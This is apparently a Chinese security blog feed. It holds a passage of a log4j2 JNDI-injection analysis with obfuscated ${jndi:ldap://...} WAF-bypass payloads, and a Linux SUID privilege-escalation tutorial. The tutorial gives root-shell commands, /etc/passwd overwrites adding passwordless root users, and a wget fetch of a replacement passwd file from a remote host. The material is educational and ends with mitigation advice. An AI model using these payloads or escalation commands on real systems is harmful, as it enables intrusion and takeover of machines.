<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> </span>&#123;</span><br><span class="line">    Message msg = event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> doRender = <span class="keyword">this</span>.textRenderer != <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder workingBuilder = doRender ? <span class="keyword">new</span> StringBuilder(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="keyword">int</span> offset = workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="keyword">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1及一下版本的noLookups默认为false</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 判断log内容是否包含&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 跟入replace方法</span></span><br><span class="line">                    workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>org.apache.logging.log4j.core.util.Constants</code>类中可以看到noLookpus默认为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>跟入<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>类的<code>replace</code>方法，里面调用<code>StrSubstitutor</code>类的<code>substitute</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        StringBuilder buf = <span class="keyword">new</span> StringBuilder(source);</span><br><span class="line">        <span class="comment">// 跟入</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> offset, <span class="keyword">final</span> <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.substitute(event, buf, offset, length, (List)<span class="keyword">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着看看<code>StrSubstitutor</code>类，定义了一些类型为<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>的成员变量，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> DEFAULT_ESCAPE = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_PREFIX = StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_SUFFIX = StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_VALUE_DELIMITER_STRING = <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ESCAPE_DELIMITER_STRING = <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以理解<code>StrMatcher</code>类为<code>log4j</code>内置的字符匹配器，先看下该类的<code>isMath</code>方法，可以看到是指定一个char数组的起始位置和匹配长度去匹配另一个char数组，若完全匹配上则返回匹配上的长度，没匹配上返回<code>0</code>，该方法在接下来的<code>substitute</code>方法中会用到较多，所以这里提一下</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935">

<p>接下来看<code>StrSubstitutor</code>类的<code>substitute</code>，该方法就是本次漏洞触发的关键方法</p>
<p>先while循环去匹配字符串中的前缀字符<code>$&#123;</code></p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964">

<p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">

<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（绕过思路1），这里判断较多，就不挨个描述，简单概括为</p>
<ul>
<li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
</ul>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204">

<p>在没有匹配上分隔符或分割处理完后，会调用<code>resolveVariable</code>方法进行解析，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548">

<h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>方法会调用<code>resolver</code>解析器的<code>lookup</code>方法，可以看到这里<code>resolver</code>支持12种类型的<code>lookup</code>实现（变形思路2）</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879">

<p>接着跟入<code>lookup</code>方法，来到了<code>org.apache.logging.log4j.core.lookup.Interpolator</code>拦截器，该拦截器通过不同前缀分配对应的<code>lookup</code>方法实现</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434">

<p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">

<h2 id="0x02-变形思路"><a href="#0x02-变形思路" class="headerlink" title="0x02 变形思路"></a>0x02 变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面可以看到<code>StrLookup</code>除了支持jndi协议还支持<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>

<h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>当然我们也可以组合上面两种思路，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111">

]]></content>
  </entry>
  <entry>
    <title>suid提权学习</title>
    <url>/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，所以打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
<h2 id="0x01-什么是SUID"><a href="#0x01-什么是SUID" class="headerlink" title="0x01 什么是SUID"></a>0x01 什么是SUID</h2><h3 id="1-1-SUID"><a href="#1-1-SUID" class="headerlink" title="1.1 SUID"></a>1.1 SUID</h3><p>SUID全称是Set owner User ID up on execution，suid是赋予二进制文件一个权限，它允许程序执行者在执行时具有该程序的拥有者(owner)的权限，对于SUID权限的文件基本有这样的限制与功能：</p>
<ul>
<li><strong>SUID权限仅对二进制程序有效</strong></li>
<li><strong>执行者对于该程序需要具有x的可执行权限</strong></li>
<li><strong>本权限仅在执行该程序的过程中有效（run-time）</strong></li>
<li><strong>执行者将具有该程序拥有者的（owner）权限</strong></li>
</ul>
<p>这里举个栗子说明下，linux中每个用户的账号密码都存储在<code>/etc/shadow</code>文件中，该文件的权限为<code>-rw-r-----</code>，普通用户无法直接修改，但每个用户都可以通过<code>passwd</code>命令来修改自己的密码，为什么/etc/shadow只允许root用户读取修改的，普通用户却能够修改这个文件内的密码呢？这就是SUID的作用。</p>
<p><code>passwd</code>命令对应的路径是<code>/usr/bin/passwd</code>，我们可以看到它的文件权限为<code>-rwsr-xr-x</code>，这里<code>passwd</code>设置了SUID权限，我们来看下普通用户tester如何通过SUID权限完成修改密码操作的：</p>
<ol>
<li>tester 用户对于 /usr/bin/passwd 这个程序具有执行权限，因此可以执行 passwd 程序</li>
<li>passwd 程序的所有者为 root</li>
<li>tester 用户执行 passwd 程序的过程中会暂时获得 root 权限</li>
<li>因此 tester 用户在执行 passwd 程序的过程中可以修改 /etc/shadow 文件</li>
</ol>
<p>普通用户直接使用<code>cat</code>查看<code>/etc/shadow</code>文件是被禁止的，这里用一张示意图来表示两者区别</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174007691-528388363.png" class="" title="img">

<p>另外需要注意的是，SUID仅可用于二进制程序上，<strong>但不能够用在shell脚本上面</strong>。这是因为shell脚本是由多个二进制执行文件进行调用执行而已，所以是否有SUID权限还是看调用的二进制执行文件，而不是shell脚本本身。当然，<strong>SUID对于目录也是无效的</strong>。</p>
<p>在搜索学习SUID时也了解到了SGID、SBIT的定义，这里也顺带提下</p>
<h3 id="1-2-SGID"><a href="#1-2-SGID" class="headerlink" title="1.2 SGID"></a>1.2 SGID</h3><p>与SUID不同的是，SGID可以针对文件或目录来设置。如果是对文件来说，SGID有如下的功能：</p>
<ul>
<li>SGID对二进制程序有用</li>
<li>程序执行者对于该程序来说，需具备x的权限</li>
<li>执行者在执行的过程中将会获得改程序用户组的支持</li>
</ul>
<p>举个栗子，使用<code>/usr/bin/locate</code>这个程序可以去查找<code>/var/lib/mlocate/mlocate.db</code>这个文件的内容，查看对应文件权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta">#</span><span class="bash"> locate是软链接指向mlocate，所以修改软连接locate的sgid权限也就是修改mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>

<p>如果我使用普通用户tester执行locate时，tester将会取得mlocate组的支持，因此就可以去读取mlocate.db的内容了。执行过程示意图如下</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174309311-990901650.png" class="" title="img">

<p>另外，SGID对目录也支持，当用户对某一目录有写和执行权限时，该用户就可以在该目录下建立文件，如果该目录用 SGID 修饰，则该用户在这个目录下建立的文件都是属于这个目录所属的组。如下图示例，sgidtest目录属于root组，且赋予了SGID权限，poom用户在该目录下创建文件将为root属组。</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231049994.png" class="" title="image-20210626231049994">

<h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>其实 SBIT 与 SUID 和 SGID 的关系并不大。SBIT 是 the restricted deletion flag or sticky bit 的简称。SBIT 目前只对目录有效，用来阻止非文件的所有者删除文件。比较常见的例子就是 /tmp 目录：</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231156650.png" class="" title="image-20210626231156650">

<p>权限信息中最后一位 t 表明该目录被设置了 SBIT 权限。SBIT 对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
<h3 id="1-4-如何设置SUID、SGID、SBIT权限"><a href="#1-4-如何设置SUID、SGID、SBIT权限" class="headerlink" title="1.4 如何设置SUID、SGID、SBIT权限"></a>1.4 如何设置SUID、SGID、SBIT权限</h3><p>SUID、SGID、SBIT权限对应的数字为<code>SUID-&gt;4，SGID-&gt;2，SBIT-&gt;1</code></p>
<p>通过数字法设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 4755 filename</span><br></pre></td></tr></table></figure>

<p>通过符号法设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod g+s filename </span><br><span class="line">chmod o+s filename</span><br></pre></td></tr></table></figure>

<p>若权限为大写S或T，则说明user/group/others本身就没有执行权限。</p>
<h2 id="0x02-关于SUID提权"><a href="#0x02-关于SUID提权" class="headerlink" title="0x02 关于SUID提权"></a>0x02 关于SUID提权</h2><p>先介绍下linux进程在运行时有3个UID:</p>
<ul>
<li>Real UID 执行该进程的用户实际的UID</li>
<li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li>
<li>Saved UID 在高权限用户降权后，保留的其原本UID</li>
</ul>
<p>在设置了SUID权限的程序在其运行时，进程的Effective UID将为程序的拥有者。例如前面说的<code>/user/bin/passwd</code>命令的权限为<code>-rwsr-xr-x</code>，程序的拥有者为root（uid=0），普通用户在执行<code>passwd</code>命令时Effective UID就为0，所以可以完成更改密码的操作。</p>
<p>我们知道nmap需要进行UDP或TCP SYN扫描时需要用到root权限，所以很多管理员会给nmap加上SUID权限，这样普通用户就可以随便使用nmap了。在nmap 5.20版本以前存在interactive交互模式，当nmap设置了SUID权限时，我们可以进入交互模式输入<code>!sh</code>提权。</p>
<p>所以<strong>拥有SUID的程序存在命令注入漏洞或其本身存在执行命令的功能，且这个程序所有者的uid为0或其他super user</strong>，那么就有SUID提权的风险。</p>
<p><strong>如何查找具有SUID权限的文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>

<p>也可通过<code>sudo -l</code>列出当前用户可sudo执行的命令</p>
<h2 id="0x03-常用于SUID提权的命令"><a href="#0x03-常用于SUID提权的命令" class="headerlink" title="0x03 常用于SUID提权的命令"></a>0x03 常用于SUID提权的命令</h2><p>下面介绍几种命令，如果这些命令具有SUID权限，将有本地提权的风险。</p>
<h3 id="3-1-nmap"><a href="#3-1-nmap" class="headerlink" title="3.1 nmap"></a>3.1 nmap</h3><h4 id="3-1-1-nmap-2-02-5-21版本"><a href="#3-1-1-nmap-2-02-5-21版本" class="headerlink" title="3.1.1 nmap 2.02-5.21版本"></a>3.1.1 nmap 2.02-5.21版本</h4><p>namp在低版本具有交互模式，可利用交互模式提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>

<p>另外Metasploit也有nmap提权的模块：<code>exploit/unix/local/setuid_nmap</code></p>
<h4 id="3-1-2-nmap高版本"><a href="#3-1-2-nmap高版本" class="headerlink" title="3.1.2 nmap高版本"></a>3.1.2 nmap高版本</h4><p>namp在高版本取消了交互模式，可编写nmap的nse脚本，修改<code>/etc/passwd</code>来新增一个用户root2来达到提权的目的。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626174624539.png" class="" title="image-20210626174624539">

<p>若namp可直接sudo执行，则可直接使用nse脚本调用<code>os.execute</code>执行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure>

<h3 id="3-2-find"><a href="#3-2-find" class="headerlink" title="3.2 find"></a>3.2 find</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627125229567.png" class="" title="image-20210627125229567">

<h3 id="3-3-vi-vim"><a href="#3-3-vi-vim" class="headerlink" title="3.3 vi/vim"></a>3.3 vi/vim</h3><p>进入vim模式执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134106867.png" class="" title="image-20210627134106867">

<p>若有sudo权限则可执行<code>sudo vim -c &#39;!sh&#39;</code>直接提权</p>
<h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134208588.png" class="" title="image-20210627134208588">

<h3 id="3-5-cp"><a href="#3-5-cp" class="headerlink" title="3.5 cp"></a>3.5 cp</h3><p>跟高版本nmap提权方法类似，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta">$</span><span class="bash"> su root3</span> </span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627142406117.png" class="" title="image-20210627142406117">

<h3 id="3-6-mv"><a href="#3-6-mv" class="headerlink" title="3.6 mv"></a>3.6 mv</h3><p>同cp命令的步骤，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
<h3 id="3-7-nano"><a href="#3-7-nano" class="headerlink" title="3.7 nano"></a>3.7 nano</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano filename</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143244017.png" class="" title="image-20210627143244017">

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143211352.png" class="" title="image-20210627143211352">

<h3 id="3-8-wget"><a href="#3-8-wget" class="headerlink" title="3.8 wget"></a>3.8 wget</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://192.168.88.88/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="3-9-其他测试未提权成功的命令"><a href="#3-9-其他测试未提权成功的命令" class="headerlink" title="3.9 其他测试未提权成功的命令"></a>3.9 其他测试未提权成功的命令</h3><p>网上见到有师傅整理的suid提权命令也包括下面几种，但我在Ubuntu 18和kali 2020中测试并不能提权成功，返回的只是当前用户的shell，这里先记录下</p>
<h4 id="3-9-1-less"><a href="#3-9-1-less" class="headerlink" title="3.9.1 less"></a>3.9.1 less</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="3-9-2-more"><a href="#3-9-2-more" class="headerlink" title="3.9.2 more"></a>3.9.2 more</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="3-9-3-awk"><a href="#3-9-3-awk" class="headerlink" title="3.9.3 awk"></a>3.9.3 awk</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="3-9-4-man"><a href="#3-9-4-man" class="headerlink" title="3.9.4 man"></a>3.9.4 man</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="3-9-5-python-perl-ruby-lua-php-etc"><a href="#3-9-5-python-perl-ruby-lua-php-etc" class="headerlink" title="3.9.5 python/perl/ruby/lua/php/etc"></a>3.9.5 python/perl/ruby/lua/php/etc</h4><p>python</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>perl</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exec</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-如何缓解"><a href="#0x04-如何缓解" class="headerlink" title="0x04 如何缓解"></a>0x04 如何缓解</h2><p>管理员应仔细审查所有SUID二进制文件，看看到底是否真的需要使用提权后运行。在这个审查过程中，<strong>应该特别关注能够在系统上执行代码或写入数据的那些应用程序</strong>。</p>
<p>对于类似nmap和ping的程序，只需要网络相关的特权即可，Linux 2.2以后增加了capabilities的概念，我们可以用到capabilities这东西做权限分离。</p>
<p>查看kali下ping命令的capabilities</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">getcap</span> /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure>

<p>这就是为什么<code>ping</code>命令未设置suid权限，却仍然可以以普通用户身份运行的原因，同样我们也可以给nmap命令增加类似的capabilities，普通用户就可以执行TCP SYN扫描啦</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span><br><span class="line">nmap --privileged -sU 127.0.0.1</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627151220669.png" class="" title="image-20210627151220669">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >谈一谈Linux与suid提权<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/sparkdev/p/9651622.html" >Linux 特殊权限 SUID,SGID,SBIT<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://jlkl.github.io/2020/01/27/Web_15/" >Linux SUID 提权<i class="fas fa-external-link-alt"></i></a></p>
<p>《鸟哥的linux私房菜（第四版）–6.4.3章》</p>
]]></content>
  </entry>
  <entry>
    <title>《静态程序分析（南京大学）》课程笔记</title>
    <url>/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>注：⭐️符号代表重要的知识点，课程还未学习完，笔记更新中ing</p>
<h2 id="1-Intermediate-Representation-IR-（第二节课）"><a href="#1-Intermediate-Representation-IR-（第二节课）" class="headerlink" title="1. Intermediate Representation(IR)（第二节课）"></a>1. Intermediate Representation(IR)（第二节课）</h2><h3 id="1-1-AST-VS-IR"><a href="#1-1-AST-VS-IR" class="headerlink" title="1.1 AST VS IR"></a>1.1 AST VS IR</h3><p>编译器运行流程</p>
